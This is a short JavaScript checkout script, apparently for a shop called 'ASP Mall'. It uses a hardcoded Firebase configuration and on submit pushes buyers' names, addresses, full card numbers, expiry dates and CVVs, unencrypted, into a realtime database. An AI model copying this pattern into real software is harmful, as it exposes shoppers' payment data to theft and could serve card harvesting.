const firebaseConfig = {
    apiKey: "AIzaSyBxiZnlr-rRRJrF67fLehr_-SpzzXW50rU",
    authDomain: "asp-mall.firebaseapp.com",
    databaseURL: "https://asp-mall-default-rtdb.firebaseio.com",
    projectId: "asp-mall",
    storageBucket: "asp-mall.appspot.com",
    messagingSenderId: "632923580254",
    appId: "1:632923580254:web:205f775331096fefd991cf"
  };

  firebase.initializeApp(firebaseConfig);

var ASP_MALLdb = firebase.database().ref('ASP_MALL');

document.getElementById('shippingform').addEventListener('submit',submitform); 

function submitform(e){
    e.preventDefault();

    var name = getElementVal('name');
    var email = getElementVal('email');
    var address = getElementVal('address');
    var city = getElementVal('city');
    var state = getElementVal('state');
    var zipcode = getElementVal('zipcode');
    var crdname = getElementVal('crdname');
    var crdnumber = getElementVal('crdnumber');
    var expmonth = getElementVal('expmonth');
    var expyear = getElementVal('expyear');
    var cvvnumber = getElementVal('cvvnumber');


    saveMessages(name,email,address,city,state,zipcode,crdname,crdnumber,expmonth,expyear,cvvnumber);

    document.querySelector('.alert').style.display = 'block';

    setTimeout(() => {
        document.querySelector('.alert').style.display = 'none';
    }, 3000);

    document.getElementById('shippingform').reset();

}
const saveMessages = (name,email,address,city,state,zipcode,crdname,crdnumber,expmonth,expyear,cvvnumber) =>{
    var newshippingform = ASP_MALLdb.push();

    newshippingform.set({
        name : name,
        email : email,
        address : address,
        city : city,
        state : state,
        zipcode : zipcode,
        crdname : crdname,
        crdnumber : crdnumber,
        expmonth : expmonth,
        expyear : expyear,
        cvvnumber : cvvnumber,

    })
}

const getElementVal = (id) =>{
    return document.getElementById(id).value;
}